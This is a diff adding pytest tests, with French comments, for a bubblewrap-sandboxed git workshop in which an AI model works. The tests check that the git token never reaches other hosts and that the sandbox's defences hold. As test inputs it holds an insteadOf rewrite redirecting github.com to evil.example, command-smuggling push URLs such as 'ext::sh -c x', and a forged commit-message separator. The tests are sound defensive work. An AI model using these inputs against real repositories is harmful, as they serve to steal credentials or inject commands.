@@ -109,3 +109,92 @@ def test_git_seals_its_start_then_commits_only_what_changed(tmp_path):
                                                                             "atelier ouvert"]
     assert go(ws.log(1, 1, offset=1)).splitlines()[0].endswith("premier pas")
     assert not go(ws.log(1, 1, offset=3)).strip()
+
+
+# ── Le dépôt distant : ce qui porte le jeton ne lit que ce que l'atelier a posé ────
+
+
+@needs_bwrap
+def test_what_the_model_runs_cannot_touch_the_git_that_carries_the_token(tmp_path):
+    ws = BwrapWorkshop(tmp_path, credentials=lambda: {"token": "ghp_SECRET", "hosts": ["github.com"]})
+    go(ws.write(1, "a.py", "x = 1\n"))
+    folder = ws.folder(1)
+    # ce que le modèle lance lit le dépôt mais ne l'écrit pas (ni un fichier, ni sa configuration)
+    wrote = go(ws.run(1, ["sh", "-c", "echo x > .git/probe"]))
+    configured = go(ws.run(1, ["git", "config", "--local", "url.https://evil.example/.insteadOf",
+                               "https://github.com/"]))
+    assert not wrote.ok and not configured.ok and not (folder / ".git" / "probe").exists()
+    assert go(ws.run(1, ["git", "log", "--oneline"])).ok  # lire, oui
+    # une configuration « globale » posée dans la maison de l'atelier (par le modèle, ou un dépôt récupéré) est ignorée
+    (folder / ".atelier-home" / ".gitconfig").write_text('[probe]\n\tkey = du-modele\n', encoding="utf-8")
+    assert go(ws._git(1, "config", "--get", "probe.key")).stdout.strip() == ""
+    # une clé locale inattendue (posée par un autre chemin) : pas d'envoi, et pas de réseau tenté
+    with (folder / ".git" / "config").open("a", encoding="utf-8") as f:
+        f.write('[url "https://evil.example/"]\n\tinsteadOf = https://github.com/\n')
+    refused = go(ws.push(1, "https://github.com/moi/depot.git", "main"))
+    assert refused.refused and "configuration locale inattendue" in refused.refused
+
+
+def test_the_token_is_shown_only_to_its_hosts_and_only_for_the_repository(tmp_path):
+    ws = BwrapWorkshop(tmp_path, bwrap="", credentials=lambda: {"token": "ghp_SECRET", "user": "x-access-token",
+                                                                 "hosts": ["github.com", "git.example"]})
+    env, secrets, why = ws._auth("https://github.com/moi/depot.git")
+    assert not why and env["GIT_CONFIG_KEY_0"] == "http.https://github.com/moi/depot.git.extraheader"
+    assert "ghp_SECRET" in secrets and env["GIT_CONFIG_VALUE_0"].startswith("AUTHORIZATION: basic ")
+    assert "ghp_SECRET" not in env["GIT_CONFIG_VALUE_0"]  # encodé, et effacé des sorties sous les deux formes
+    port, _, _ = ws._auth("https://git.example:8443/equipe/outils.git")
+    assert port["GIT_CONFIG_KEY_0"] == "http.https://git.example:8443/equipe/outils.git.extraheader"  # le port reste
+    other, none, why = ws._auth("https://evil.example/moi/depot.git")
+    assert "GIT_CONFIG_KEY_0" not in other and none == () and "evil.example" in why
+    refused = go(ws.push(1, "https://evil.example/moi/depot.git", "main"))
+    assert refused.refused.startswith("pas d'envoi : le jeton n'est pas autorisé")
+    for url in ("http://github.com/x.git", "https://moi:pw@github.com/x.git", "ext::sh -c x", "-https://x"):
+        assert go(ws.push(1, url, "main")).refused
+    assert go(ws.push(1, "https://github.com/x.git", "--force")).refused
+
+
+@needs_bwrap
+def test_secrets_are_scrubbed_before_the_output_is_cut(tmp_path):
+    ws = BwrapWorkshop(tmp_path, max_output_chars=100)
+    go(ws.write(1, "a.txt", "x"))
+    script = "head -c 60 /dev/zero | tr '\\\\0' a; printf ghp_SECRET; head -c 200 /dev/zero | tr '\\\\0' b"
+    got = go(ws.run(1, ["sh", "-c", script], secrets=("ghp_SECRET",)))
+    assert "ghp_SECRET" not in got.stdout and "ghp_" not in got.stdout and got.truncated
+
+
+@needs_bwrap
+def test_a_commit_message_cannot_forge_a_line_of_history(tmp_path):
+    ws = BwrapWorkshop(tmp_path)
+    go(ws.write(1, "a.py", "x = 1\n"))
+    go(ws.commit(1, "premier"))
+    go(ws.write(1, "a.py", "x = 2\n"))
+    forged = "vrai titre\x1edeadbeef\x1f1\x1fpirate\x1ffaux"
+    assert go(ws._git(1, "commit", "-qam", forged)).ok
+    commits = go(ws.commits(1, 10))
+    assert len(commits) == 3 and {c.author for c in commits} == {"Mika"}
+    assert [c.title for c in commits][-1] == "atelier ouvert"
+    assert go(ws.head(1)) == go(ws._git(1, "rev-parse", "HEAD")).stdout.strip()
+
+
+@needs_bwrap
+def test_a_push_sends_the_pinned_commit_not_what_head_became(tmp_path):
+    ws = BwrapWorkshop(tmp_path, credentials=lambda: {"token": "ghp_SECRET", "hosts": ["github.com"]})
+    go(ws.write(1, "a.py", "x = 1\n"))
+    go(ws.commit(1, "premier"))
+    pinned = go(ws.head(1))
+    seen: list[tuple[str, ...]] = []
+
+    async def fake_git(goal, *args, **kw):  # sans réseau : on regarde ce qui serait poussé
+        if "push" in args:
+            seen.append(args)
+            return await BwrapWorkshop._git(ws, goal, "rev-parse", "HEAD")
+        return await BwrapWorkshop._git(ws, goal, *args, **kw)
+
+    ws._git = fake_git  # type: ignore[method-assign]
+    go(ws.write(1, "a.py", "x = 2\n"))
+    go(ws.commit(1, "après l'accord"))
+    assert go(ws.head(1)) != pinned
+    go(ws.push(1, "https://github.com/moi/depot.git", "main", pinned))
+    [args] = seen
+    assert f"{pinned}:refs/heads/main" in args and "credential.helper=" in args and "protocol.allow=never" in args
+    assert go(ws.push(1, "https://github.com/moi/depot.git", "main", "0" * 40)).refused  # un commit inconnu
